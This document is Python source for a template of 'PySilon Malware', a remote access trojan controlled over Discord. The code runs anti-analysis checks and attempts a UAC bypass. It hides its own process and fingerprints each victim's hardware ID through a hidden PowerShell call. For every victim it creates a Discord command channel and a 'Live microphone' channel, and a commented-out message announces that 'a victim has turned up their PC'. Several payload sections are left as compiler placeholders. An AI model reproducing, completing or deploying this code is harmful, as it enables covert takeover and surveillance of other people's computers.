#<imports>
from urllib.request import urlopen
from discord.ext import commands
from getpass import getuser
import subprocess
import discord
import asyncio
import ctypes
import json
import sys
import os
#</imports>

# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
# Don't edit anything in this file. Everything will be handled by compiler. #
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

#<configuration />
bot_token = ''
guild_ids = []
#</configuration>
DEFAULT = 'DEFAULT'

class PySilon(commands.Bot):
    def __init__(self, command_prefix, self_bot) -> None:
        def IsAdmin() -> bool: return ctypes.windll.shell32.IsUserAnAdmin() == 1
        if protection_check(): os._exit(0)
        if single_instance_lock(): os._exit(0)

        if not IsAdmin():
            if GetSelf()[1]:
                if UACbypass(): os._exit(0)
        else:
            proccess_was_hidden = False
            if proc_hider.hide_process(): proccess_was_hidden = True

        #!preload.intendation=2
        self.load_bot(command_prefix, self_bot)

    async def first_run_check(self) -> None:
        guild_id, guild_id_index = guild_ids[0], 0
        hwid = subprocess.check_output("powershell (Get-CimInstance Win32_ComputerSystemProduct).UUID", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
        channel_not_found = True
        for _ in guild_ids:
            for channel_name in self.get_guild(guild_id).channels:
                if hwid in str(channel_name):
                    return await self.sequent_run(channel_name)
            if guild_id_index != len(guild_ids)-1:
                guild_id_index += 1
                self.guild_id = guild_ids[guild_id_index]
            else: break

        if channel_not_found:
            for guild in guild_ids:
                get_guild = self.get_guild(guild)
                if len(get_guild.channels) < 499:
                    self.guild_id = guild
                    break

        await self.first_run(guild_id, hwid)

    async def first_run(self, guild_id, hwid) -> None:
        self.working_directory = [os.getenv('SystemDrive'), "Users", getuser()]; self.save_working_dir()
        category = await self.get_guild(guild_id).create_category(hwid)
        temp = await self.get_guild(guild_id).create_text_channel('main', category=category); channel_ids['main'] = temp.id
        temp = await self.get_guild(guild_id).create_voice_channel('Live microphone', category=category); channel_ids['voice'] = temp.id

    async def sequent_run(self, category) -> None:
        self.fetch_working_dir()
        if self.working_directory == None or self.working_directory == []: self.working_directory = [os.getenv('SystemDrive'), "Users", getuser()]; self.save_working_dir()
        category_channel_names = []
        for channel in category.channels:
            category_channel_names.append(channel.name)

        if 'main' not in category_channel_names and channel_ids['main']:
            temp = await self.get_guild(self.guild_id).create_text_channel('main', category=category)
            channel_ids['main'] = temp.id

        if 'Live microphone' not in category_channel_names and channel_ids['live']:
            temp = await self.get_guild(self.guild_id).create_voice_channel('Live microphone', category=category)
            channel_ids['voice'] = temp.id

    def load_bot(self, command_prefix, self_bot) -> None:
        commands.Bot.__init__(self, command_prefix=command_prefix, self_bot=self_bot, intents=discord.Intents.all())

        self.guild_id = 1178999695570374697
        self.channel_id = 1262286966205059082

        self.load_commands()

    async def on_ready(self):
        await self.get_channel(self.channel_id).send('Bot is ready')
        await self.first_run_check()
        await self.change_presence(activity=discord.Game(name='⭐ us on GitHub [pysilon.net]'))
        await self.user.edit(username='PySilon Malware', avatar=urlopen('https://raw.githubusercontent.com/mategol/PySilon-malware/v4-dev/resources/icons/default_icon.png').read())

        '''await self.get_channel(self.channel_id).send(embed=self.generate_embed(
            title='New session detected!',
            description='A victim has turned up their PC!',
            color=0x34ebeb,
            fields=[['', grab_info().prepare_info(), False]],
            footer=['Please ⭐ our repository if you enjoy'],
            url='https://github.com/mategol/PySilon-malware',
            author=[DEFAULT, DEFAULT]
        ))'''

    def load_commands(self):
        @self.command(name="server", pass_context=True)
        async def server(ctx):
            await ctx.channel.send('asdasd')
        
        #!commands.intendation=2
        
    def fetch_working_dir(self):
        try:
            with open(f'{os.path.dirname(sys.executable)}\\working_directory.json', 'r') as fetch_dir:
                self.working_directory = json.load(fetch_dir)
        except:
            self.save_working_dir()
            self.working_directory = [os.getenv('SystemDrive'), "Users", getuser()]
        return self.working_directory

    def save_working_dir(self):
        with open(f'{os.path.dirname(sys.executable)}\\working_directory.json', 'w') as save_dir:
            json.dump(self.working_directory, save_dir)
            
    def generate_embed(self, **kwargs):
        embed = discord.Embed(title=kwargs['title'], description=kwargs['description'], color=kwargs['color'])
        for cfg in kwargs.keys():
            match cfg:
                case 'fields':
                    for field in kwargs['fields']: embed.add_field(name=field[0], value=field[1], inline=field[2])
                case 'thumbnail': embed.set_thumbnail(url=kwargs['thumbnail'])
                case 'footer':
                    footer_text = (kwargs['footer'] if kwargs['footer'] != DEFAULT else 'PySilon Malware') if type(kwargs['footer']) != list else (kwargs['footer'][0] if kwargs['footer'][0] != DEFAULT else 'https://github.com/mategol/PySilon-malware')
                    if type(kwargs['footer']) == list and len(kwargs['footer']) == 2: 
                        footer_icon = kwargs['footer'][1] if kwargs['footer'][1] != DEFAULT else 'https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/author_icon.jpg'
                        embed.set_footer(text=footer_text, icon_url=footer_icon)
                    else: embed.set_footer(text=footer_text)
                case 'url': embed.url = kwargs['url'] if kwargs['url'] != DEFAULT else 'https://github.com/mategol/PySilon-malware'
                case 'timestamp': embed.timestamp = kwargs['timestamp']
                case 'image': embed.set_image(url=kwargs['image'])
                case 'author':
                    author_name = (kwargs['author'] if kwargs['author'] != DEFAULT else 'PySilon Malware') if type(kwargs['author']) != list else (kwargs['author'][0] if kwargs['author'][0] != DEFAULT else 'PySilon Malware')
                    if type(kwargs['author']) == list and len(kwargs['author']) == 2: 
                        author_icon = kwargs['author'][1] if kwargs['author'][1] != DEFAULT else 'https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/author_icon.jpg'
                        embed.set_author(name=author_name, icon_url=author_icon)
                    else: embed.set_author(name=author_name)
        return embed

#!misc.intendation=0

bot = PySilon(command_prefix='.', self_bot=False)
bot.run('')